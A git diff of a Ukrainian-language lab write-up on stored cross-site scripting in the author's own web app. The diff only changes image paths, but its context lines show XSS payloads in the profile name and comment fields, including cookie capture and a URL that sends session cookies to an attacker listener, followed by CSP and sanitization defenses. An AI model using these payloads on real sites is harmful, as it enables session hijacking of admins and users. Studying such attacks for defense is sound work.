@@ -64,14 +64,14 @@
                             <hr />
 <h2>Наявність вразливості</h2>
 <p>Stored Cross Site Scripting у випадку з моїм застосунком присутній в налаштуваннях профілю користувача.</p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210100402.png" alt="Pasted image 20260210100402.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210100402.png" alt="Pasted image 20260210100402.png" /></div>
 
 <hr />
 <p>У користувача є можливість змінювати власне ім'я. Проблема в тому, що введені користувачем дані не перевіряються на XSS. Тобто в поле імені можна ввести наступний payload, до прикладу, який просто виводитиме повідомлення з текстом: </p>
 <pre><code class="language-html">&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;
 </code></pre>
 <p>Через відсутність фільтрації цей payload буде збережено в тому ж вигляді (18id - user):</p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210101044.png" alt="Pasted image 20260210101044.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210101044.png" alt="Pasted image 20260210101044.png" /></div>
 
 <hr />
 <p>Імена користувачів відображаються у вікні адміністратора. Коли <strong>admin</strong> зайде в таблицю користувачів, то клієнт має зробити запит на сервер та отримати їхні імена. Після чого JS скрипт опрацює отримані дані, та сформує таблицю:</p>
@@ -95,20 +95,20 @@
 
 <hr />
 <p>В результаті в панелі адміна буде таке повідомлення, яке свідчить про XSS вразливість:</p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210100922.png" alt="Pasted image 20260210100922.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210100922.png" alt="Pasted image 20260210100922.png" /></div>
 
 <p>Таким же чином ми можемо отримати доступ до cookie:</p>
 <pre><code class="language-html">&lt;img src=x onerror=console.log(document.cookie)&gt;
 </code></pre>
 <div class="callout callout-info">В цьому випадку кукі виведуться в консоль браузера самого адміна</div>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210102342.png" alt="Pasted image 20260210102342.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210102342.png" alt="Pasted image 20260210102342.png" /></div>
 
 <hr />
 <p>Але все вище перераховане свідчить лише про наявність XSS вразливості і не несе великої шкоди. Та окрім цього поля введення присутні ще місця з такою ж вразливістю. </p>
 <hr />
 <h2>Використання вразливості</h2>
 <p>На сайті є функція коментарів, де кожен користувач може залишати свій коментар і в подальшому вони будуть відображатися на головній сторінці всіх авторизованих користувачів:</p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210141412.png" alt="Pasted image 20260210141412.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210141412.png" alt="Pasted image 20260210141412.png" /></div>
 <blockquote>
 <p>І виявляється, що тут є вразливість до XSS! Це ж треба..</p>
 </blockquote>
@@ -140,7 +140,7 @@ if __name__ == '__main__':
 <pre><code>http://192.168.100.20:8888/?c=session=...
 </code></pre>
 <p>Я авторизувався від імені <strong>moderator</strong> користувача та <strong>admin</strong>. Коли вони отримують доступ до цієї вже небезпечної сторінки, в терміналі атакуючого відображатимуться їхні cookie(ну й також там ще <strong>user</strong> cookie, оскільки payload я завантажував від його імені і на ньому він теж спрацював):</p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210142843.png" alt="Pasted image 20260210142843.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210142843.png" alt="Pasted image 20260210142843.png" /></div>
 
 <hr />
 <p>Або можна зробити запит також через <strong>fetch</strong>:</p>
@@ -205,7 +205,7 @@ def set_csp(resp):
 </ul>
 <hr />
 <p>Якщо зайти на сторінку, на якій відтворюється payload, то CSP заблокує його і почне сваритися в консолі: </p>
-<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210151830.png" alt="Pasted image 20260210151830.png" /></div>
+<div class="image-div"><img src="..\..\images\Pasted image 20260210151830.png" alt="Pasted image 20260210151830.png" /></div>
 
 <hr />
 <h3>HTML дезінфекція</h3>
